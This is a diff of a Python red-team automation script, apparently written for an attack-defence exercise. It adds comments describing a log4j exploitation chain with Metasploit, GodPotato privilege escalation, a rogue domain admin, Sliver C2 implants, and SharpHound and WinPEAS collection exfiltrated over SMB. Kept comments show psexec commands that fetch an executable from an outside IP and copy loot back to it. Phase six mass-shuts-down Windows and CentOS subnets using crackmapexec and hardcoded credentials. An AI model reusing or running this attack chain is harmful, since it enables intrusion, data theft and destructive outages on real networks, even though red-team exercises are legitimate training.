@@ -338,6 +338,14 @@ def phaseFour():
 	subprocess.run(["sudo", "nmap", "-A", "-Pn", "-iL", "alives.txt", "-oN", "enum.txt"])
 	log_event("Phase four enumeration complete.")
 	print("Done with enumeration. Sanders will proceed with manual log4j exploitation.")
+	# msfconsole search log4j
+	# use 0 
+	# set options
+	# exploit
+	# whoami /priv 
+	# upload godpotato.exe
+	# getsystem account and create domain admin spacial.rend
+	# install sliver c2 beacons
 	
 
 def phaseFive():
@@ -361,7 +369,14 @@ def phaseFive():
 	log_event(f"Dumps complete.")
 	print(f"Proceed with manual impacket-psexec and evil-winrm tasks.")
 
-	# The following is for DC2
+	# evil-winrm DC2 -u spacial.rend -p BlueTeamSlayer1!
+	# Upload sharphound.exe and winpeas.exe
+	# Zip results of both
+	# Exfiltrate via SMB
+	# drop more implants on DC2
+
+
+	# OLD-OLD-OLD
 	# impacket-psexec {username}:{password}@target "powershell.exe -c iwr -uri http://185.141.62.2:8000/svchost.exe -out C:\Users\Administrator\Music\svchost.exe"
 	# impacket-psexec {username}:{password}@target "powershell.exe -c C:\Users\Administrator\Music\svchost.exe --CollectionMethods All --zipfilename zubat.zip"
 	# impacket-psexec {username}:{password}@target "powershell.exe -c copy-item -Path C:\Users\Administrator\Music\*.zip -destination \\185.141.62.2\tmp"
@@ -377,36 +392,41 @@ def phaseSix():
 	password = "password"
 	winuser = "spacial.rend"
 	winpass = "BlueTeamSlayer1!"
-	centosTargets = [
-	208.11.20.201, 208.11.20.202, ..., 208.11.20.215,
-	208.11.21.201, 208.11.21.202, ..., 208.11.21.215,
-	208.11.22.201, 208.11.22.202, ..., 208.11.22.215,
-	208.11.23.201, 208.11.23.202, ..., 208.11.23.215,
-	208.11.25.201, 208.11.25.202, ..., 208.11.25.215
-	]
-	windowsTargets = [
-	208.11.20.1, 208.11.20.2, ..., 208.11.20.30,
-	208.11.21.1, 208.11.21.2, ..., 208.11.21.30,
-	208.11.22.1, 208.11.22.2, ..., 208.11.22.30,
-	208.11.23.1, 208.11.23.2, ..., 208.11.23.30,
-	208.11.25.1, 208.11.25.2, ..., 208.11.25.30
-	]
-	centosCommand = 'shutdown now'
-
-	for target in centosTargets:
-		try:
-			log_event(f"Shutting down centOS {target}")
-			run_ssh_command(target, username, password, centosCommand)
-		except Exception as e:
-			pass
 	
-	for host in windowsTargets:
+	windowsSubnets = [
+	"208.11.20.1-30",
+	"208.11.21.1-30",
+	"208.11.22.1-30",
+	"208.11.23.1-30",
+	"208.11.25.1-30",
+	]
+	
+	centosSubnets = [
+	"208.11.20.201-215",
+	"208.11.21.201-215",
+	"208.11.22.201-215",
+	"208.11.23.201-215",
+	"208.11.25.201-215",
+	]
+	
+	for subnet in windowsSubnets:
 		try:
-			command = f"impacket-psexec {winuser}:{winpass}@{host} \"shutdown /r /t 0\""
-			log_event(f"Shutting down windows {host}")
+			command = f"crackmapexec winrm {subnet} -u {winuser} -p {winpass} -X \"Stop-Computer -Force\""
+			log_event(f"Running {command}")
 			subprocess.run(command, shell=True, text=True)
+			#time.sleep(300)
 		except Exception as e:
 			pass
+
+	for hosts in centosSubnets:
+		try:
+			command = f"crackmapexec ssh {hosts} -u {username} -p {password} -x \"shutdown now\""
+			log_event(f"Running {command}")
+			subprocess.run(command, shell=True, text=True)
+			#time.sleep(300)
+		except Exception as e:
+			pass
+	#Kill DC2 based on blue team progress.
 	log_event(f"Attack Chain Complete. GG EZ.")
 
 def main():
@@ -420,6 +440,7 @@ def main():
 	#phaseFour()
 	#phaseFive()
 	#phaseSix()
+	
 	'''
 			Red Team IP Space	
 	======================================
